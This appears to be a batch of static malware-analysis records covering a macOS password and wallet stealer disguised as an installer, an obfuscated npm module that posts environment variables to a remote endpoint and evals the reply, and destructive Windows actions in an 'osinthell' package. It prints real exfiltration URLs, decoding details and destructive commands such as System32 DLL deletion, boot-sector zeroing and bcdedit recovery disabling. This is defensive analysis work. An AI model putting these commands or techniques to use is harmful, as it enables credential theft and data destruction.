members.identification: Universal x86_64/ARM64 macOS native password and wallet stealer masquerading as Installer
execution_trace: The native entry constructs a decoded string, obtains its c_str, and calls system(). ARM64 entry addresses: decoder call 0x1000006ac, system call 0x1000006b8.

Both encrypted constants independently decode to the same 37076-byte osascript -e command. Seed 0x11667; byte XOR with state; update ((state * 0x3785) & 0xffffffff) % 35999. Ciphertext file offsets: x86_64 19600; ARM64 85472. The modulus is computed from the embedded build-time string 09:59:59.
The osascript command builds a second AppleScript through run script, quoted strings, and return separators. Its last statement invokes the main handler.
Main reads or obtains the login password using a hidden Installation dialog and dscl . authonly validation; stores it in ~/.pwd and the collection directory.

Copies Chromium and Gecko credential/cookie stores, browser-extension wallet storage, desktop wallet directories, login.keychain-db, Safari cookies, Notes databases/media and filtered Desktop/Documents files into a random /tmp directory. Chrome generic-password lookup is an additional conditional acquisition path for an account authenticating with an empty password.
Archives the collection with ditto, sends it using curl POST --data-binary to http://charge0x.at/log, then removes the temporary collection directory and ZIP.
Downloads a Ledger Live replacement ZIP, stops Ledger Live, uses the acquired password with sudo -S to remove its application bundle, and extracts the replacement into /Applications.

When ~/.botid is absent/empty, fetches a remote shell command, embeds it in a KeepAlive/RunAtLoad LaunchDaemon with /bin/bash -c, installs it with sudo, and bootstraps it. A bootstrap failure falls back to a nohup command.
members.verdict_basis: Credential phishing, secret-store collection and transmission, wallet application replacement and unwanted durable execution are incompatible with a legitimate installer. The member itself contains the malicious script; its archive conviction is not used as the verdict.
members.limits: No specimen or remote payload was executed, and remote replacement/persistence contents were not fetched. Successful sudo, TCC access and network delivery are not established. The native stealer payload and attempted effects are statically established.
members.marker_note: Installer stealer: password theft and persistence; Chrome query added

members.identification: parser-session 1.1.9 CommonJS writer replacement implementing exfiltration and remote JavaScript evaluation
execution_trace: On module evaluation, requires os and ../package.json and constructs a data object spreading the complete process.env, then adds package version, OS platform, hostname, username and external IPv4 interface MAC addresses.

g() decodes each pair of hexadecimal characters with parseInt(...,16) and String.fromCharCode. Its eight-slot table resolves to require, axios, post, https://log-server-lovat.vercel.app/api/ipcheck/703, headers, x-secret-header, secret, then.

The exported function ignores its arguments and invokes require(axios)[post](endpoint, data, custom headers)[then](r => eval(r.data)), swallowing promise rejection. This sends environment/host data and evaluates a successful response in process.
members.verdict_basis: Exporting every environment variable to a concealed endpoint and evaluating its response are malicious, unrelated to parser or logging-writer duties. Obfuscation conceals the HTTP API and endpoint.
members.limits: Execution requires loading and invoking the export. As supplied, ../package.json resolves to a missing src/package.json; src/index.js also names a different .pnpm/httpreslog writer path that is absent. These packaging problems prevent claiming successful or automatic execution, but do not alter the unambiguous malicious implementation.

members.identification: osinthell v.js Windows system-library deletion action
execution_trace: Imports child_process.execSync and exports a zero-argument function.
On invocation, runs del /F /S /Q C:\Windows\System32\*.dll in a shell, discards stdio, and ignores exceptions.
The package index calls this export from sorgu(); importing v.js alone does not invoke the action.
members.verdict_basis: An undisclosed, forced recursive deletion of Windows system DLLs with no parameters, user confirmation or reporting is system sabotage, incompatible with the claimed utility purpose.
members.limits: Requires invocation, Windows and sufficient access. Runtime success is not established.
members.hostile_coverage_goal: One independently supported destructive outcome: System32 DLL deletion. Existing hostile and suspicious command/action traits cover it. Execution, ignored stdio and catches remain notable; no third distinct hostile behavior exists in these bytes.

members.identification: osinthell f.js physical-disk boot-sector destruction action
execution_trace: Imports fs and child_process.execSync and exports a zero-argument function.
Opens \\.\PhysicalDrive0 as r+, allocates a 512-byte zero-filled Buffer, writes that same buffer to that handle at disk position zero, and closes the handle.
Separately attempts bootrec /fixmbr with shell execution, ignored stdio and swallowed errors.
The package index invokes the export from sorgu().
members.verdict_basis: Silently hardcoding the first physical disk and destroying its first sector, including its partition table, is destructive. The later MBR repair command does not restore the wiped partition table.
members.limits: Requires invocation, Windows and sufficient raw-disk access. The repair command is described as repair, not mislabeled as independently malicious.
members.hostile_coverage_goal: One destructive outcome: first-sector zeroing. Existing bound source/handle/buffer/offset matchers and hostile silent-export composite cover it. Added the previously missed openSync capability in its file-open home. Further hostile rules would duplicate disk destruction or mislabel the repair operation.

members.identification: osinthell t.js Windows boot-recovery sabotage action
execution_trace: Imports child_process.execSync and exports a zero-argument function.
Runs bcdedit /set {default} bootstatuspolicy ignoreallfailures, followed by bcdedit /set {default} recoveryenabled No, discarding output and swallowing errors.
The package index invokes the export from sorgu().
members.verdict_basis: A silent fixed-target export disables both failure handling and recovery without an administrative interface or stated recovery-management purpose; the implementation supports likely sabotage.
members.limits: Requires invocation, Windows and sufficient BCD privileges. Individual BCD settings can be administrative operations; hostile intent comes from the complete silent action.
members.hostile_coverage_goal: Boot failure handling and recovery disablement form one recovery-sabotage action. Both command primitives are detected as suspicious/notable, and the complete action is hostile. A third hostile objective is unsupported.
members.marker_note: osinthell t: disables recovery and ignores boot failures

members.identification: osinthell p.js drive-root file truncation action
execution_trace: Imports fs/path and exports a zero-argument function.
Enumerates the immediate children of C:\, D:\, E:\ and F:\, joins each name to its drive root, checks statSync(...).isFile(), and calls writeFileSync(path, empty string) without an options argument.
Default write mode truncates existing files. The loop is not recursive and does not securely erase entire drives. Nested catches ignore errors. The package index invokes the export from sorgu().
members.verdict_basis: Indiscriminately emptying existing regular files across four hardcoded drive roots has a destructive purpose and no useful OSINT function.
members.limits: Requires invocation and write access; inaccessible roots/files are skipped. Successful destruction is not assumed.
members.hostile_coverage_goal: One destructive outcome, already represented by two accurate hostile rules for the bound truncation loop and explicit default-mode empty overwrite. No independent third malicious outcome is present; no extra traits were added to meet a count.
members.marker_note: osinthell p: truncates existing files across four drive roots
